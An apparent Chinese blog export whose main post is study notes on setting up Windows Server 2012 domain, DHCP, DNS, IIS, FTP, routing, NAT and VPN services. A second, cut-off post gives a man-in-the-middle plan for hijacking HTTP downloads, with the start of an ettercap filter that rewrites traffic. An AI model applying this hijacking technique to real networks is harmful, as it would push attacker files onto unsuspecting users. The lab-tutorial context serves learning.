    <content type="text"><![CDATA[感觉前面借鉴l3m0n师傅的文章，写的非常好，通俗易懂，但是里面关于搭建域环境的教程不够全面，找师傅借了本大三的网络配置教材学习下 Windows server 2012基础域和活动目录域目录树 在Windows server 2012中，活动目录的域名采用DNS域名的命名规则进行命名，DNS域名的命名规则见之前的那篇DNS学习笔记 DNS学习笔记 域目录树下域的命名规则都是连续的，这也是判断域是否属于同一个域目录树的重要条件。并且在整个域目录树中，所有域共享同一个AD活动目录 域目录林 域目录林中的每个域目录树都有唯一的命名空间，并不一定连续命名 在创建域目录林时，组成域目录林的两个域目录树的树根之间会自动创建双向、传递的信息关系 信任关系 域目录树的根域和子域中之间，域目录林的不同树根之间都会自动创建双向的、传递的信任关系，使根域与子域之间、域目录林中的不同树之间可以相互访问，并可以从其他域登录到本域 用户和组管理用户账户类型 本地域账户可以分为系统内建本地域账号和创建本地域账户，一般管理员通过重命名或禁用administrator账户的方式使得恶意用户更难取得域控的反问权。如果禁用了administrator账户，可以通过以安全模式启动域控的方式，使用administrator账户访问域控，这个管理员账户在安全模式下一直有效 创建和管理域用户账户 这里需要区分一下域用户账户和本地用户账户 本地用户账户是在工作组环境上或是域的成员机登录本地机器所用的账户，而域用户账户是在域的管理模式下域上的用户所使用的账户 本地用户账户存储在本地的sam数据库中，而域账户存储在AD中 使用本地用户账户的时候，用户只能使用该账户登录到本地计算机上，而域账户可以在整个域环境中所有的计算机上进行登录 本地账户只能在账户所属的计算机上进行管理，每个计算机上的管理员单独管理自己机器上的本地账户，而域账户通过AD用户和计算机管理攻击进行统一管理 若要使某个用户能访问各种工作相关的资源，只需将该用户加入正确的组。但是虽然可以通过用户账户登录计算机，但不能通过组账户登录计算机。 根据组账户的使用范围，可以划分为本地组账户和域组。 本地组账户为一种安全组，只被赋予了对创建该组的计算机上的资源的权限，可以拥有任意用户账户。然而一个大型组织网络中的大多数组账户都是域组账户，可以使用这些域组账户帮助控制对共享资源的访问，并委派特定的域范围的管理组 添加或删除服务组件这里需要注意的是，Windows server 2012中用角色和功能替代了之前几代server 服务器的添加/删除Windows组件 服务器角色指的是服务器的主要功能 NTFS文件系统NTFS文件系统提供了以下新功能 可以对单个文件设置权限，而不仅仅是对文件夹设置权限 提供了文件加密功能 提供了文件压缩功能 提供了磁盘配额功能 设置文件加密 每个文件都有一个唯一的文件加密密钥，用于以后对文件数据进行解密。文件的加密密钥本身是自加密的，它通过与用户的EFS证书对应的公钥进行保护。文件加密密钥同时也被其他每个已被授权解密该文件的EFS用户的公钥和每个故障恢复代理的公钥所保护 DHCP服务器配置与管理DHCP服务概述DHCP是动态主机分配协议的简称，是一个简化主机IP地址分配管理的TCP/IP标准协议，使用UDP协议工作 DHCP工作原理每当DHCP客户机启动时，便从DHCP服务器租用地址信息，包括IP地址、子网掩码或配置，比如默认网关地址。当DHCP服务器收到一个IP地址请求时，便从它的地址数据库中选择IP地址信息并将其提供给DHCP客户机。如果客户机接受，那么DHCP服务器在特定的时间内将这一地址租给这个客户机用 DHCP租用过程 IP租用请求阶段 IP租用提供阶段 IP租用选择阶段 IP租用确认阶段 之后DHCP客户机重新登录网络时，直接发送包含前一次所分配的IP地址的DHCP Request信息。如果DHCP服务器不能将原来的IP分配过去，会返回一个标示信息。接着客户机再次发送IP租用请求来请求一个新的IP地址。客户机上也可以执行ipconfig/release命令来释放IP地址 客户机更新IP地址租约 客户机拿到的IP地址是有租借期限的，到期会被服务器收回IP。在客户机启动时和IP租约期超过一半时，客户机会自动向DHCP服务器发送更新IP租约的信息。如果此IP还有效，服务器向客户机发送一个确认信息，此时客户机获得新的IP租约 一般不推荐使用无限的租用期，即使是采用DHCP静态分配IP地址，也最好采用几个月的租用期代替 DHCP的六个工作状态 DHCP客户机经历了在建立客户机使用的有效IP地址过程中的六个转换状态 初始化 选择 请求 捆绑 更新 重新捆绑 配置Windows server 2012 DHCP服务器安装DHCP服务器 在一台Windows server2012虚拟机中安装DHCP服务，使这台虚拟机可以为域中的其他计算机提供动态分配IP地址的能力 （1）在安装DHCP服务之前，需要为虚拟机的计算机网卡设置静态IP地址和子网掩码，并运行TCP/IP协议，具体操作参照前面那篇磨皮皮 （2）开始-&gt;管理工具-&gt;服务器管理器-&gt;添加角色和功能 安装DHCP服务器（进行这一步之前必须要先设置静态IP地址） （3）安装完成后，开始-&gt;服务器管理-&gt;所有服务器，此时能看到DHCP服务器已经安装完成 在DHCP服务器上创建作用域 （1）开始-&gt;管理工具-&gt;DHCP-&gt;DHCP控制台-&gt;IPV4（IPV6也适用），然后新建作用域 （2）在新建作用域向导中填入作用域名称即可 （3）接着输入起始IP和结束IP，子网掩码的长度和值系统会自动输入 （4）填入被排除的起始IP地址和结束IP地址，当然了，这里被排除的可以是一个IP地址，也可以是一个IP段。被排除的IP地址必须是在起始IP地址和结束IP地址之间，通常这个被排除的IP地址是保留给拥有静态IP地址的服务器的，因为服务器的IP地址一般来说是固定不变的。建议在工作中创建DHCP作用域时，把网络中已经使用的静态IP地址也包括在作用域中，然后把它们排除 （5）之后会弹出设置IP地址租约期限的对话框，系统默认是8天，可以自行更改 （6）选择稍后配置这些选项，完成作用域的创建 （7）刚创建好的作用域状态是不活动的，需要激活才能生效，在DHCP控制台即可激活，在地址池中可以看到整个域中IP的使用情况，其中被排除的IP一般由服务器使用。值得注意的是，在控制台界面，右键作用域选择属性可以更改很多内容，但是不能更改子网掩码，因为域一旦创建，其网络ID就不能更改。 配置DHCP客户机设置DHCP客户机网络属性 将固定IP改为自动获得IP地址即可 设置DHCP选项DHCP服务器除了能动态分配IP地址外，还可以把TCP/IP的其他参数如子网掩码、默认网关、DNS服务器、WINS服务器等信息自动传给客户端 服务器选项 在DHCP控制台中右键服务器选项-&gt;配置选项，即可出现配置对话框 在DHCP服务器选项中常用的几个选项是：003路由器的IP地址（一般对应网关）、006DNS服务器的IP地址、015DNS域名 配置客户的保留 设置方式为：在DHCP控制台上右键保留-&gt;新建保留即可。需要注意的是，保留的IP地址一定要是作用域中的IP地址，但一定不要是排除的IP地址，排除和保留是互斥的 IP作用域的维护 作用域协调 在DHCP服务器上作用域内IP地址的租用信息会分别存储在DHCP数据库文件和注册表数据库内。如果DHCP数据库文件与注册表数据库之间发生了信息不一致的现象，则可以利用协调(reconcile)功能来修正DHCP数据库文件 超级作用域 当DHCP服务器上有多个作用域时，可以组成超级作用域，作为单个实体来管理。超级作用域常用于多网配置，多网是指在同一物理网段上使用多个DHCP服务器以管理分离的逻辑IP网络 当超级作用域创建完成以后，会显示在DHCP控制台中，原有的作用域就像是超级作用域的子目录 超级作用域可以解决多网结构中的某种DHCP部署问题，比较典型的情况就是当前活动作用域的可用地址几乎耗尽，又要向网络添加更多计算机，此时可使用另一个IP网络地址范围以拓展同一物理网段的地址空间 DHCP数据库位置在Windows\system32\dhcp（server 2012）文件夹内，DHCP服务器中的设置数据全部存在DHCP.mdb文件内，另外dhcp文件夹里还有一个backup文件，该备份文件保存着DHCP数据库及注册表的相关参数。 配置DHCP中继代理DHCP客户端向DHCP服务器发送IP地址请求不能跨越路由器，如果想利用一台DHCP服务器给多个物理网段的计算机分配IP地址，就要求在没有DHCP服务器的网段内创建一个DHCP服务器中继代理。实际上DHCP中继代理是一种路由协议，设置中继代理实际上就是把装有Windows server 2012的计算机设置成一个简单的路由器 有关80/20规则当在网络中实现DHCP服务时，可能会出现由于DHCP服务器不可用的情况，为避免这种情况发生，在实际工作中可以在一个子网中建立两个DHCP服务器。在这两个DHCP服务器上分别建立一个作用域，让这两个作用域分别属于一个子网。但IP地址不能交叉，在一个DHCP服务器作用域上分配80%的IP地址，另一个服务器作用域上分配20%的IP地址，这样当一个服务器发生故障时，另一个还能工作。 DNS服务器配置DNS服务概述DNS域名空间 当定位一个文件位置时，从根目录到子目录再到文件名。但是定位一个主机名时，是反过来的，从最终位置都父域再到根域，如:baidu.com 查询模式 DNS有三种查询模式 递归查询 DNS客户端向服务器发起查询请求，如果这个服务器没有查询到，这个服务器就会代替客户端向其他服务器发起查询请求。一般由客户端发起的查询都是递归查询 循环查询 第一台服务器向第二台服务器发起查询请求，如果第二台服务器没有查询到，这个服务器就会提供第三台服务器的IP地址，让第一台服务器直接向第三台服务器发起查询请求。 反向查询 依据客户端提供的IP地址来查询主机名，反向查询的前提是要建立一个反向查询区域，其名称的最后部分为in-addr.arpa。但是由于反向查询会占用大量系统资源，会给网络带来不安全因素，所以大多数的DNS服务器不提供反向查询。但是在运行nslookup诊断程序时，以及在iis内会用到反向查询区域 DNS的数据文件 区域文件 当一个DNS中创建一个区域后，其区域文件会被自动创建，其默认文件名为域名名.dns，存储在%systemroot%\system32\dns文件夹中 缓存文件 缓存文件存储着根域内的DNS服务器名称和IP地址的对照数据，每台DNS服务器的缓存文件都一样。当安装DNS服务器时，缓存文件会被自动复制到%systemroot%\system32\dns文件夹中，文件名为cache.dns 反向查询区域文件 反向查询区域文件名称的IP地址的网络号部分必须反写，例如针对192.168.0.1的网络反向查询功能的区域文件名称为1.0.168.192.in-addr.arpa 在Windows 2012 server中配置DNS服务在安装DNS服务器之前，需要先把DNS服务器的IP地址设为静态的 创建正向查询区域 主要区域 主要区域是用来存储此区域内所有主机数据的正本。当在DNS服务器内创建一个主要区域和区域文件后，这个DNS服务器就是这个区域的主要名称服务器 辅助区域 辅助区域是用来存储此区域内所有主机数据的副本，这份数据是从其主要区域利用区域转送的方式复制过来的，并且这个区域文件只可读。 存根区域 存根区域是指含有名称服务器(NS)起始的授权机构(SOA)和粘连主机(A)记录的区域副本 Active Directory集成的区域 是指将此区域的主机数据存储在域控制器的Active Directory中，这份数据会自动复制到其他域控制器中。一般只有域控制器的DNS服务器才会使用Active Directory集成的区域 在正向区域中创建记录 常用的DNS服务支持的资源记录类型 资源记录类型 说明 SOA(Strat of Authority) 用于标示域内哪台是授权服务器，区域数据文件的第一个记录必须是SOA记录 NS(Name server) 指定给特定的名称服务器列表 A(Host) 记录主机名到IP地址映射的列表，提供正向查询 PTR（Point） 用来记录在反向查找区域内的主机数据，以便提供反向查询 SRV（service） 用于标示哪台服务器提供何种服务 CNAME（alias） 别名，用来记录区域内某台式机的别名 MX（Mail Exchanger） 标示哪台服务器负责域内的右键服务 HINFO（Host Information） 主机信息，记录主机的CPU类型、操作系统等信息 在反向区域中创建记录 创建反向区域记录的方法有两种： 右键反向查找区域名称，创建指针 在正向查找区域内创建主机记录时，可以顺便勾选创建相关的指针。但是需要注意的是，创建此选项时，相关反向查找区域必须已经存在 配置DNS客户端以及DNS服务测试配置客户端 在客户端主机上设置静态的DNS服务器地址即可 DNS服务器测试 测试可以用ping命令和nslookup命令 记录列表： ping命令测试 nslookup命令测试 nslookup验证邮件交换记录mx 反向查找 DNS服务器属性接口：用户可以在此输入提供DNS服务请示的IP地址，默认为所有IP地址 转发器：当DNS服务器接到DNS客户端的请求时，首先尝试从服务器内部的数据库内查询是否有所需要的数据，如果服务器查找到数据库内没有这个数据，将转发向其他服务器在此进行查询操作 高级：在高级选项中，用户可以设置名称检查与启动时加载数据的方式、过时记录自动清理等选项 根提示：根提示内存储外界DNS服务器数据的缓存文件，当DNS服务器向外界查询时，将根据提示内的数据进行查询。如果域内的DNS服务器有所变动，该缓存文件必须更改 调试文件：调试日志是帮助用户了解服务器运行情况的。当用户选择相应的调试项后，输入日志存储路径后，服务器会将日志发送到指定路径，用户可以通过该日志了解服务器情况，该选项默认禁止 事件日志：记录DNS服务事件，该事件可以在配置DNS窗口直接查看 监视：用户可以通过监视选项卡对DNS进行测试，测试方式有简单查询和递归查询两种，如果在规定时间内通过，说明配置正确 IIS服务器配置web服务器配置建立虚拟目录 虚拟目录只是一个文件夹，并不真正位于iis宿主文件内，但在访问web站点的用户看来，就跟位于iis服务的宿主文件夹一样 虚拟目录的意义 1）便于拓展。虚拟目录可以与原有网站文件不在用一个文件夹、同一个磁盘，甚至可以不在同一个计算机上。 2）增删灵活。虚拟目录可以根据需要随时添加到虚拟web网站，或者从网站中移除 ，因此它具有非常大的灵活性。移除或增加虚拟目录时不会对web站点的运行产生影响 3）易于配置。虚拟目录使用与宿主网站相同的IP地址、端口号、主机头，因此不会与其标示产生冲突。在创建虚拟目录时，将自动即成宿主网站的配置，并且对宿主网站配置时，也将直接传递至虚拟目录。 创建虚拟目录 1）在iis管理器的web站点功能视图界面点击查看虚拟目录 2）点击添加虚拟目录弹出虚拟目录添加对话框 3）在别名文本框中设置该虚拟目录的别名，用户用别名来连接虚拟目录。别名是唯一的。在物理路径文本框中输入该虚拟目录的文件夹路径 配置站点属性 如果web网站中的信息非常敏感，可以采用ssl加密方式。ssl默认端口号为443 一般情况下，多数web网站都允许匿名访问，即客户不用输入账号密码。如果禁止匿名访问的话，iis将尝试使用其他验证方法。 基本身份验证。在网络上传输弱加密的密码，通常在客户端与服务器之间的连接是安全连接时，才能使用基本身份验证。 建立基于主机头的多虚拟主机站点 1）在DNS服务器中新建两个主机，分别为“test1“和”test2“，IP地址均为192.168.2.3 2）分别建立两个网站，在设置IP地址、端口、主机名时，主机名的文本框中输入新建网站的域名，如“test1.test.com”和”test2.test.com” 3）如果要修改网站的主机名，点击网站功能视图中的绑定，打开编辑网站绑定对话框，然后点击编辑就可以进行修改了 1使用主机名来搭建多个具有不同域名的web网站，与利用不同IP地址建立虚拟主机的方式相比，这种方式更经济实用，可以充分的利用有限的IP地址资源 建立基于端口的多虚拟主机站点 和上面的方式类似，只是上面的方式在添加网站时没有设定端口号，这里不同的web站点需要设定专属的端口号 建立基于IP的多虚拟主机站点 1）控制面板-&gt;网络连接，右键要添加IP地址的网卡的本地连接，选择属性，在internet协议(TCP/IP)属性窗口中，选择高级按钮，将要添加的IP地址添加到这里 2）用上述办法添加两个网站，填入新添加的两个不同的IP地址 TFP服务器配置建立FTP站点的步骤和前面类似，就不赘述了 建立虚拟目录 使用FTP虚拟目录时，用户不会知晓文件的具体保存位置，会更安全 虚拟目录的创建 1）设置虚拟目录别名，也就是该虚拟目录的名称 2）设置虚拟目录的物理路径。该文件既可位于本地硬盘，也可以是远程计算机的贡献文件夹。远程共享文件夹的引用格式为\\计算机名\共享名 3）打开连接为对话框，可以选择如何连接到在“物理路径”文本框键入的路径。默认为“应用程序用户（通过身份验证）” 配置站点属性 设置IP地址和端口 刚刚安装好的FTP服务器上默认状态下IP地址为“全部未分配”，即FTP服务与计算机中所有的IP地址绑定在一起，FTP客户端用户可以使用该服务器中绑定的任何IP地址及默认端口进行访问，而且允许来自任何IP地址的计算机进行匿名访问，不安全。 在操作-&gt;绑定，双击要编辑的网站进行设置，需要设置的有三个项目：IP地址、端口、主机名 设置主目录 1）设置主目录文件，和前面的设置方法类似。但是值得注意的是，利用另一台计算机上的共享位置作为主目录文件时，用户通过FTP客户端访问网站时会被要求输入该计算机的账户密码，不仅让访问变得复杂，而且以重要用户身份登入会带来潜在威胁 2）设置主目录权限 配置FTP IP地址和域限制 通过对FTP IP地址的限制，可以只允许或拒绝某些特定范围的计算机可以访问该FTP站点。 在FTP主页面双击FTP IP地址和域限制。若要根据域名配置限制，必须先启用域名限制，方法是在任务列表中点击编辑功能设置，然后设置启用域名限制 这其中有一条为恢复为父项。恢复功能从父配置中继承设置。此操作将为此功能删除本地配置设置。但是这个操作在服务器级别不能用 FTP请求筛选 FTP请求筛选功能可以设置FTP服务的筛选规则包括： 1）文件拓展名：例如如果拒绝*.exe文件的访问，可以组织internet客户端将可执行文件上传到web服务器 2）隐藏段：例如若要组织对web应用程序的bin目录的访问，可以添加bin目录为FTP的隐藏段。当FTP客户端 登录站点时，bin文件不会显示在目录列表中，如果FTP客户端尝试更改到bin文件夹时，FTP服务会返回拒绝访问 3）拒绝的URL序列：和上面的隐藏段类似，唯一的区别是在登录站点时，这里会显示bin文件夹 4）命令：例如如果拒绝FTP syst命令的访问，可以组织internet客户端确定服务器的操作系统 配置FTP身份验证 有两种类型的身份验证方法：内置和自定义 内置身份验证方法不能从FTP服务器中删除，但是自定义的可以删除 1）内置身份验证方法 （1）匿名身份验证：提供匿名用户名和密码，允许任何任何用户访问公共内容。默认情况下是禁止的 （2）基本身份验证：要求用户提供有效的Windows用户名和密码以获取内容的访问权限。用户账户 可以对于FTP服务器是本地账户或域账户。基本身份验证在网络上传输未加密的明文密码，推荐用ssl连接 2）自定义身份验证方法 1）asp.net身份验证：要求用户提供有效的.net用户名和密码以获取内容的访问权限。.net账户可以来自于你的web内容共享的asp.net用户数据库，也可以是单独的asp.net用户数据库 2）iis管理器身份验证：要求用户提供有效的iis管理器用户名和密码以获取内容的访问权限。最好在客户端与服务器之间使用ssl连接时才启用iis管理器身份验证 配置FTP授权规则 仅在FTP身份验证中启用了基本身份验证，此时Windows账户还不能访问FTP站点，还需要给FTP配置账户以及权限，在FTP授权规则中可以进行授权 在FTP站点中设置访问权限的同时，还必须在Windows资源管理器中为FTP根目录设置ntfs文件夹权限，因为ntfs权限优先于FTP站点权限。 FTP站点默认设置 在连接窗口中点击网站，选择操作，点击FTP站点默认值，可以修改很多站点默认值 建立多FTP站点 虚拟FTP站点 虚拟FTP站点可以拥有自己的IP地址和主目录，可以单独进行配置和管理，可以单独启动、暂定和停止，并且能建立虚拟目录。利用虚拟FTP站点可以分离敏感信息，或者分离不同作用的数据，从而提高数据的安全性。 虚拟站点的建立 在创建虚拟站点之前，需要做好一下工作 1）设置多个IP地址或主机名 2）创建或指定主目录 3）虚拟站点的配置与管理 在浏览器中测试FTP站点 匿名访问时的格式为：ftp://服务器地址 Windows账户访问FTP服务器的格式为：ftp://用户名:密码@地址 路由和VPN服务VPN的核心是在利用公共网络建立虚拟私有网 路由基础路由器是能够进行数据包转发的设备，有两种： 硬件路由器：专门设计用于路由的设备，不能运行应用程序 软件路由器：又称多宿主计算机或多宿主路由器，可以看成是带有两个以上网卡的服务器 软件路由器的作用与硬件路由器类似，但其可控制型更强，可以对网络之间的访问进行控制，例如可以设置允许哪些IP地址访问 路由选择 路由选择有着多种不同的策略，他们包括： 最短通路路由选择：最短通路路由选择法的选用一条代价最少的通路，将分组数据从源地址发往目的地址。算法：Dijkstra算法和Ford&amp;fulkerson算法 固定通路路由选择：在固定通路路由选择中，在中心确定一组路由表，分发到网络中的每个节点。如果网络稳定，这种方案可以优化产生很好的结果 饱和路由选择：饱和路由选择是为了在电路交换网络中运行而开发的一个呼叫建立过程。在收到一个新的连接请求时，一个节点把该请求广播给它的所有邻居。此方案的主要优点是简单、灵活、可靠，因为它的性能不受网络拓扑改变的影响。主要缺点为节点必须处理和传送大量的控制报文 路由表 路由器没有优先级一说，平等对待每个网路。 若一节点通过一个网络与另一个节点连接，则说此两个节点相隔一个路由段。 路由器进行路由选择时经常要查找路由表。路由表包含了一个数据库，该数据库存储了路由器如何在网络中寻径的消息。其每一行包含了网络地址、距离和下一个接受包的路由器地址。在dos下输入route print命令就可以看到本机路由表 路由表由五部分组成： 网络目标：目标主机所属的网络地址 网络掩码：用来划分IP地址的网络ID和主机ID 网关：本机主机将IP数据包转发到其他网络时所经过的IP地址。可以是本地网络适配器的IP地址或是同一网段内的路由器的IP地址 接口：本地主机在网络中转发数据包的IP地址 跃点数：路由器经过的路由器树 永久路由标示此处的路由路径不会因为关机而关闭，它存储在注册表中，每次系统重新启动时都会自动设置此路径 为了避免路由器过于庞大，可以设置一个默认路由，这样设定那些在路由表中找不到的网络，从此路由端口中转发出去，把寻址的任务交给下一个路由器 路由协议 （1）路由协议：通过提供共享路由选择信息的机智，将路由选择协议的消息在路由器之间传送 （2）被路由协议：是任何在网络层地址中提供了足够的信息的网络协议，该网络协议允许将数据包从一个主机转发到以地址方案为基础的另一个主机，如IP协议 选路协议由很多，分为两大类： 外部网关协议：用于各地本地系统和主干网之间传送路由信息 主要功能有：外部邻站的获取，邻站可达性测试，选路信息更新 交换路由信息的两个路由器称之为邻站 内部网关协议：内部网关协议按照交换信息的方法可进一步划分为距离向量路由协议和链路状态路由协议 （1）选路信息协议就是基于距离向量的选路协议，只与直接连接到网络中的路由交换信息。每个路由器都将信息转发到直接连接的路由器。此协议允许一个通路最多只能油15个路由段组成，只适用于小型网络 ​ 距离向量路由协议的主要优点在于简单，路由器只通过广播与直接连接的邻居通信。缺点包括但不限于饱和时间长，常常出现循环路由之类的问题，通信开销大 （2）内部网关路由协议和选路信息协议相比，内部网关路由协议将网络的带宽、时延、可靠性和负载等因素综合起来，提供了一种混合的选路度量。适合在大规模网络中使用 （3）链路状态路由协议使每个路由器都与网络中的其他路由器交换路由表。能够在发生变化时马上交换信息，从而减少饱和时间，开放最短通路优先是一种公开发表的链路状态向量协议用IP数据抱传送，并且数据报很短，减少了路由信息的通信量 开放最短通路优先协议有两个要点：一是每个路由器不断地测试所有路由器状态，二是周期性地向所有其他路由器广播链路的状态。当网络很大时，此协议要比选路信息协议好得多 配置Windows server 2012软路由器配置Windows server 2012路由服务 （1）服务器管理-&gt;选择服务器角色-&gt;远程访问 勾选DirectAccess和VPN和路由选项，完成安装 （2）右键服务器选择配置并启用路由和远程访问，接着点击两个专用网络之间的安全连接 （3）在请求拨号连接中选择否，配置完成 windows server 2012远程访问路由器将已安装的网络设备当作一系列路由接口、设备和端口来看。 路由接口：Windows server 2012路由器使用一个路由接口来转发单播IP、ipx或AppleTalk（苹果公司创建的一组网络协议）数据包。有三种类型的路由接口： lan接口：lan接口是物理接口，通常代表使用诸如以太网或令牌环之类的局域网技术的局域连接。lan接口总是活动的并且通常不需要身份验证过程激活 请求拨号接口：请求拨号接口是代表点对点连接的逻辑接口。点对点连接基于物理连接。或基于逻辑连接。请求拨号接口通常需要身份验证过程连接。请求拨号接口所需的设备是设备上的一个端口 IP专用的IP隧道接口：IP中的IP隧道接口是代表已建立隧道的点对点连接的逻辑接口。此接口不需要身份验证过程连接 设备：设备是提供请求拨号和远程访问链接以用于建立点对点连接的端口的硬件或软件。设备可以是物理设备（例如调制解调器）或虚拟设设备（例如虚拟专用网络VPN协议） 端口：端口是支持单个点对点连接的隧道设备 配置静态路由 环境： 12345678910计算机A: IP:10.0.0.1/24 网关:10.0.0.2服务器B: ip:20.0.0.1/24服务器C: IP:20.0.0.2/24计算机D: 网关:30.0.0.1 ip:30.0.0.2/24 如果此时直接由计算机A向计算机D发起连接，会显示数据包不能到达计算机D，说明服务器B不能转发数据包。为了使服务器B转发数据包，必须在服务器B上添加静态路由： 打开路由和远程访问控制台，选择IPv4，点击静态路由，选择新建静态路由 目标栏填目标地址所在的网络ID网络掩码填subnet mask值网关填服务器C的IP地址 或者直接在服务器B的控制台输入 1route add 30.0.0.0 mask 255.255.255.0 20.0.0.2 在服务器C上同样的操作 1route add 10.0.0.0 mask 255.255.255.0 20.0.0.1 再一次ping 30.0.0.2显示连接成功 在控制台窗口中可以看到TTL=126，而ping本地子网中主机时TTL=128，说明经过了两个路由器的转发 最后在计算机A中输入tracert 30.0.0.2命令，就能查看数据包从源地址到达目标地址的过程中所经过的路由器信息 配置动态路由 （1）为了使服务器B能够进行数据包转发，在服务器B上配置RIP协议。在服务器B上打开路由和远程访问控制台，右键常规，选择新建路由协议 （2）选择RIP Version 2 for Intertnet Protocol （3）设置RIP协议所使用的网络接口。在控制台下右键RIP，选择新建接口 （4）在弹出的窗口中含有四个选项卡 常规： 操作模式：RIP协议周期性发出声明，将自己路由表中的条目复制给其他路由器。自动-静态更新模式，只有当其他路由器请求时才发送路由表；周期性更新模式，通过在“高级”选项卡中设置发送路由表的周期，可以使RIP路由器周期性的发送声明 传出数据包协议：有RIP1版广播和RIP2版广播，还有RIP2多点传送 静态RIP：只监听和接受其他路由器的RIP声明，本身不向外发送声明 传入数据包协议：有RIP1和2版，RIP1版，RIP2版 路由的附加开销：指路由中继段的个数 激活身份验证：激活后将发送RIP声明是包含所设置的密码，所有与此接口相连的路由器也要使用相同的密码，否则就不能够进行正常的路由交换。 安全：可以设置路由器接受的范围 邻居：可以设置路由器和其他路由器的通信方式 高级：可以设置RIP广播的周期性间隔等 注意：动态路由协议OSPF是基于链路状态的路由协议，其优点是效率高，网络开销小，但配置起来比较麻烦，一般用于大型网络 配置NAT服务 （1）NAT的工作过程 网络地址转换NAT是一种IP路由协议，能在转发数据包时，在内部和外部计算机之间转换IP地址。NAT对外部网络隐藏网络内部使用的IP地址，从未保护网络免受未经授权访问。对于internet来说，可见IP就是运行NAT服务的服务器IP地址 Windows server 2012的NAT路由协议有以下优点： 利用NAT，多个用户能够共享一条internet连接，通过拨号上网或本地网络访问internet如果在网络上没有其他服务器提供DHCP服务，NAT可以提供利用NAT，企业内部网络上的任何依附IP的设备都能与internet上的计算机通信，而不需要其他软件 （2）配置NAT服务 1）要使用NAT，一般要用两块网卡，一块连接internet，一块连接内部网路 2）右键NAT，选择新增接口，依据网卡是连接内网还是外网来选择“公用接口连接到internet”还是“专用接口连接到专用网络” 3）对于连接到internet上的网卡接口，在地址池中添加IP地址，如果是连接到内网的网卡接口，就不需要设置地址池 NAT服务器还可以代表nat客户端执行DNS查询。路由和远程访问NAT服务器对包括在客户端请求中的internet主机名进行解析，然后将该IP地址转发给客户端： 1）在路由和远程访问管理器中，选择IPv4，右键选择NAT，选择属性，在地址分配选项卡上选中使用DHCP分配器自动分配IP地址复选框。如果要为专用网络上的DHCP客户端进行分配，需要在IP地址和掩码中配置IP地址的范围。排除避免分配给专用网络上的DHCP客户端的地址，需要在排除中添加IP地址 2）要进行DNS服务器的主机名称解析，需要在名称解析选项卡上选中使用域名系统DNS的客户端复选框。如果专用网络上的主机希望通过NAT来发送DNS域名查询，需要选中当名称需要解析时连接到公用网络复选框，然后在请求拨号接口中选择合适的请求拨号接口的名称即可 （3）使用NAT的客户机的配置 要想让网络中的客户机使用NAT来访问网络，必须设置网络客户机的网络属性，将客户机internet协议属性中的默认网关设置成NAT服务器的内网地址 如果客户机时从动态主机配置协议（DHCP）服务器接收其IP的话，需要在高级选项卡里，选择IP设置-&gt;添加，加入NAT服务器的内部IP地址 配置Windows server2012 VPN服务器VPN基础 （1）运行Windows server 2012的远程访问服务器提供两种不同的远程访问连接 拨号网络：通过使用远程通信提供商提供的服务，远程客户机使用非永久的拨号连接到远程访问服务器的物理端口上，这是使用的网络就是拨号网络 虚拟专用网络（VPN）：虚拟专用网络是穿越专用网络的安全的点对点连接，或像internet一样的公共网络的产物。虚拟专用网络客户机使用特定的成为隧道协议的基于TCP/IP的协议，来对虚拟专用网络服务器的虚拟端口进行依次虚拟呼叫 与拨号网络相比，虚拟专用网络总是虚拟专用网络客户机和虚拟专用网络服务器之间逻辑的、非直接的连接 要模拟点对点链路，应压缩或包装数据，并加上一个提供路由信息的报头，该报头使数据能够通过共享或公用网络到达其重点要模拟专用链路，为保密起见应加密数据。封装和加密专用数据之处的连接时虚拟专用网络（VPN）连接 （2）VPN连接的属性 通过IPSec使用PPTP和L2TP的VPN连接有以下属性 封装：通过VPN技术将用提供路由信息的数据头加密数据，它允许数据经过国际网络传输 身份连接：VPN连接的身份验证采用三种不同的方式： 1）通过PPP(点对点协议)身份验证的用户级别身份验证 2）使用ISAKMP(密钥管理协议)进行的机器级别身份验证 3）数据验证和完整性 数据加密 （3）VPN隧道协议 点对点隧道协议（PPTP），是点对点协议的拓展，增强了PPP的身份验证、压缩和加密机制 第二层隧道协议（L2TP），依赖于加密服务的网际协议安全（IPSec） VPN服务器配置 （1）启动VPN服务器和启动路由和远程访问一样，只是选择远程访问(拨号或VPN)。如果已经配置过其他的路由远程访问服务，可先禁止现有的路由和远程访问，然后选择配置并切用路由和远程访问重新配置。 ​ 选择远程访问（拨号或VPN），然后选中VPN服务，下一步，选中VPN复选框，到网络接口框选择默认的下一步。接着选择来自一个指定的地址范围，输入VPN用户拨入口分配的地址范围，然后一路下一步完成安装 （2）服务器启动后，开始-&gt;管理工具-&gt;计算机管理,打开计算机管理控制台。在本地用户和组中创建VPN专用用户账号VPNuser，并设置该用户的属性，点击拨入，选中网络访问权限中的允许访问。如果设置该用户登录VPN服务器时分配固定IP，在本属性框中设置分配固定IP地址 建立VPN客户连接 （1）在客户端桌面上右键网上邻居属性打开网络和拨号连接框，选择创建一个新的连接，接着选择连接到我的工作场所的网络 （2）下一步，选择虚拟专用网络连接，输入VPN服务器的主机名和IP地址，接下来就是常规操作了 路还很长]]></content>
      <tags>
        <tag>内网渗透</tag>
        <tag>环境搭建</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击之http数据劫持]]></title>
    <url>%2F2018%2F04%2F01%2F%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E4%B9%8Bhttp%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[前面学习了几个中间人攻击框架，今天用来实验下http数据劫持，就用下载这个过程来演示中间人攻击的实战 实验环境123攻击机：kali 2017 IP：10.211.55.7目标机：Windows 7 IP：10.211.55.4网关：10.211.55.1 下载过程分析这个下载站分为直接下载和间接下载： 间接下载： 直接下载： 交互下载过程： 针对两种不同的下载方式，分别确定劫持替换下载思路： 直接下载：定位“200 OK”响应包，将其修改为302跳转，并用一个location重定向到我们的攻击地址，完成下载劫持 间接下载：定位“302”响应包，替换其location的跳转地址，重定向到我们的攻击地址，完成下载劫持 过滤规则： 123456789101112131415161718192021222324252627282930# ettercap v0.8.2# filename:onlinedown.filter# Written by Gaearrow## Disable Encodingif (ip.proto == TCP &amp;&amp; tcp.dst == 80)&#123; if (search(DATA.data, &quot;Accept-Encoding&quot;))&#123; replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing&quot;); &#125;&#125;## Replaceif (ip.proto == TCP)&#123; ## Replace 302 Response if (search(DATA.data, &quot;302 Moved Temporarily&quot;))&#123; msg(&quot;Found 302 